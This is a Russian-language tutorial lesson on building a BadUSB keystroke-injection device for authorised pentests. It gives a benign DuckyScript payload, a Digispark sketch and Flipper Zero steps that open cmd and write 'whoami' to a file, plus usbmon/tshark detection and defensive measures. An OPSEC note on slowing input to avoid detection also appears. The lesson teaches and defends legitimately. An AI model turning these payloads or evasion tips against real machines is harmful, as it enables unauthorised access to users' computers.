## Вопрос, с которого всё начинается

В прошлом уроке мы разобрали чужой BadUSB-имплант и прочитали набранную им команду. Теперь вопрос обратный: а если нужно **самому** собрать такое устройство — например, чтобы на согласованном пентесте показать заказчику, что открытый USB-порт в переговорной позволяет выполнить команду от имени вошедшего пользователя? С чего начать и как убедиться, что payload действительно набирается?

Разберём это на одном конкретном payload'е и проследим его от текста до байтов в эфире.

## Наш пример: payload, который оставляет след

Мы соберём максимально безобидный payload: устройство открывает терминал и записывает имя пользователя в файл `proof.txt`. Никаких обратных шеллов и загрузок — только доказательство, что ввод произошёл. Это правильный тон для демонстрации: минимум воздействия, максимум доказательства.

Дальше — как превратить эту идею в реальные нажатия.

## Шаг 1: из чего состоит HID-отчёт

Клавиатура общается с хостом через **HID-отчёты** — блоки по 8 байт. Разберём один:

```
00 00 04 00 00 00 00 00
│  │  │  └─────────── до 6 usage-кодов одновременно нажатых клавиш
│  │  └─ usage-код первой клавиши (0x04 = 'a')
│  └─ зарезервировано
└─ модификаторы: биты Ctrl/Shift/Alt/GUI
```

Первый байт — **модификаторы**: бит 0x02 — Left Shift, 0x01 — Left Ctrl, 0x08 — Left GUI (клавиша Win). Когда мы «нажимаем» Win+R, отправляется отчёт с модификатором GUI и кодом клавиши `r`. Когда отпускаем — отчёт из восьми нулей.

Главное: хост не различает, человек это или микросхема. Если дескриптор говорит «клавиатура», ввод принимается.

## Шаг 2: язык DuckyScript

Чтобы не выписывать байты вручную, придумали язык описания payload'ов — **DuckyScript**. Наш след-нагрузка на нём выглядит так:

```duckyscript
DELAY 2000
GUI r
DELAY 600
STRING cmd
ENTER
DELAY 1200
STRING whoami > %TEMP%\proof.txt
ENTER
```

| Команда | Что делает |
|---------|-----------|
| `STRING` | набрать текст |
| `DELAY` | пауза в миллисекундах |
| `GUI` / `CTRL` / `ALT` | зажать модификатор |
| `ENTER` / `TAB` / `ESC` | спецклавиша |
| `REPEAT` | повторить предыдущую строку N раз |

Логика читается сразу: подождать загрузки ОС, открыть «Выполнить» (Win+R), набрать `cmd`, дождаться консоли, выполнить команду. `DELAY` здесь критичен — без пауз хост не успевает открыть окно, и следующий текст уходит «в никуда».

## Шаг 3: собираем payload на Digispark

Самый дешёвый путь — плата **Digispark** на микроконтроллере ATtiny85. Она прошивается из Arduino IDE и эмулирует HID-клавиатуру библиотекой `DigiKeyboard`. Наш payload превращается в скетч:

```cpp
#include "DigiKeyboard.h"
void setup() {
  DigiKeyboard.delay(2000);                          // ждём ОС
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);   // Win+R
  DigiKeyboard.delay(600);
  DigiKeyboard.print("cmd");                         // печатаем cmd
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1200);
  DigiKeyboard.print("whoami > %TEMP%\\proof.txt");  // команда
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
void loop() {}
```

Задержки в коде соответствуют `DELAY` из DuckyScript: `delay(2000)` = `DELAY 2000`. Прошиваем — и Digispark при подключении к любому хосту начнёт это набирать.

## Шаг 4: тот же payload на Flipper Zero

Flipper Zero позволяет не прошивать плату, а просто положить текстовый скрипт на SD-карту. Тот же DuckyScript кладём в `badusb/proof.txt` и запускаем:

```
Apps → USB → Bad USB → proof.txt → Run
```

Flipper поддерживает подмножество DuckyScript (`STRING`, `DELAY`, `GUI`, `CTRL`, `ALT`, `ENTER`, `REPEAT`). Удобство в отладке: сначала прогоняем payload на своей машине с открытым текстовым редактором вместо терминала — видно, что именно набирается, и можно поправить раскладку и задержки.

## Шаг 5: убеждаемся, что устройство — действительно HID

Перед запуском на цели проверяем, кем устройство представляется. Подключаем к тестовой машине и смотрим класс интерфейса:

```
$ lsusb -v 2>/dev/null | grep -B1 -A1 bInterfaceProtocol
      bInterfaceClass         3 Human Interface Device
      bInterfaceSubClass      1 Boot Interface Subclass
      bInterfaceProtocol      1 Keyboard
```

Класс 3, протокол Keyboard — значит, ОС загрузит драйвер клавиатуры и примет нажатия. Если бы стоял класс 8 (Mass Storage), payload набираться не стал бы: хост ждал бы файловую систему, а не нажатия.

## Шаг 6: что видит защитник

Тот же трафик, который для нас — payload, для защитника — улика. Снимаем его через `usbmon` (как в прошлом уроке) и смотрим интервалы между нажатиями:

```
$ tshark -r badusb.pcap -Y 'usbhid.data' \
    -T fields -e frame.time_delta -e usbhid.data | head -4
0.000812000000  0000040000000000
0.000774000000  0000000000000000
0.000901000000  0000002c00000000
0.000790000000  0000000000000000
```

Интервалы `0.0008` с — микросекундные. Человек физически не способен печатать с такой частотой. Именно по этой аномалии HID-инъекцию и ловят: ровный поток отчётов без «человеческих» пауз и ошибок.

## На что смотреть дальше

- **Раскладка.** DuckyScript набирает по US-раскладке; на системе с русским языком символы «поедут». Стройте payload из символов, совпадающих в обеих раскладках, или переключайте язык первым нажатием.
- **Задержки под цель.** Слишком быстрый ввод теряет символы на медленной машине; слишком медленный — заметен пользователю. Начинайте с больших `DELAY` и уменьшайте.
- **UAC и EDR.** Payload не может «нажать» в защищённый диалог с другого рабочего стола, а Windows Defender блокирует загрузку PowerShell. Работайте через легитимные пути и уже выданные права.
- **Правовые рамки.** HID-инъекция — только на своём стенде, в согласованном пентесте или в CTF. Несогласованное применение — неправомерный доступ, даже если «ничего не сломалось».
- **Payload виден в логе.** `usbmon` фиксирует аномальные интервалы — учитывайте это в OPSEC.
- **Стенд важнее цели.** Прогон payload'а в виртуалке с текстовым редактором экономит время и снижает риск.

## Как это выглядит целиком

Маршрут в одну историю: пишем DuckyScript `DELAY 2000 / GUI r / STRING cmd / ENTER / STRING whoami > %TEMP%\proof.txt`, переносим в скетч Digispark или в `badusb/proof.txt` на Flipper. Проверяем `lsusb -v`, что интерфейс — класс 3, протокол Keyboard. Подключаем к стенду, ждём — в `%TEMP%` появляется `proof.txt` с именем пользователя. Затем снимаем `usbmon`-дамп и в `tshark` видим интервалы `0.0008` с — доказательство автоматизации. От идеи до улики — пять шагов.

## Шаг 7: payload под разные операционные системы

Один и тот же DuckyScript не сработает одинаково на Windows, macOS и Linux: различаются сочетания клавиш и способ запуска команды. В Windows это `GUI r` (Win+R) и `cmd` или `powershell`; в macOS — `GUI SPACE` (Spotlight) и `Terminal`, либо `CTRL SPACE`; в Linux (GNOME) — `CTRL ALT t` для терминала. Кроме того, на Linux команда набирается в оболочке иначе, и `%TEMP%` там не существует. Практический вывод: payload всегда пишут под конкретную цель, а перед применением прогоняют на стенде с той же ОС и той же раскладкой. Универсального «нажми и готово» не бывает.

## Шаг 8: как от этого защищаться

Защита от HID-инъекции строится в три слоя. Первый — контроль устройств (Device Control): политика, разрешающая только известные VID/PID и классы, блокирует незнакомые клавиатуры. Второй — аномалии: EDR и системы мониторинга ловят нетипично быстрый ввод, а `usbmon`-логи показывают микросекундные интервалы. Третий — организационный: блокировка неиспользуемых USB-портов физически, запрет подключать найденные флешки, обучение сотрудников. Ни один слой не даёт 100%: whitelist обходится подделкой VID/PID (см. урок про Facedancer), но вместе они резко поднимают планку.

## Частые вопросы

**Почему хост не требует подтверждения при подключении клавиатуры?**
Так задумано: USB — это «plug and play», устройство самоописывается, а клавиатура — базовый класс, драйвер для неё есть в ядре. Хост не может отличить настоящую клавиатуру от микросхемы, которая притворяется клавиатурой, потому что на уровне протокола они неразличимы.

**Что будет, если раскладка не US?**
DuckyScript посылает usage-коды, соответствующие физическим клавишам US-раскладки. Если в системе включена русская раскладка, те же коды введут другие символы — команда «поедет». Решения: переключать язык первым нажатием (`GUI SPACE` или `ALT SHIFT`), либо строить строку только из символов, одинаковых в обеих раскладках (латиница, цифры, часть знаков).

**Может ли payload обойти UAC?**
Нет, если UAC включён: запрос на повышение прав появляется в защищённом рабочем столе (Secure Desktop), куда инъекция с обычного рабочего стола не попадает. Payload работает только с уже выданными правами пользователя. Именно поэтому в демонстрациях выбирают безобидные действия вроде записи `whoami`, а не попытки повысить привилегии.

**Что важнее для OPSEC — скорость или незаметность?**
Обычно незаметность: быстрый ввод (интервалы ~1 мс) технически проще, но именно он выдаёт автоматизацию в логах. Если стоит задача не быть пойманным, ввод замедляют, добавляют «человеческие» паузы и ошибки — но это уже вопрос сценария red team, а не учебного payload'а. Для пентеста важнее доказательство срабатывания, поэтому скорость вторична.
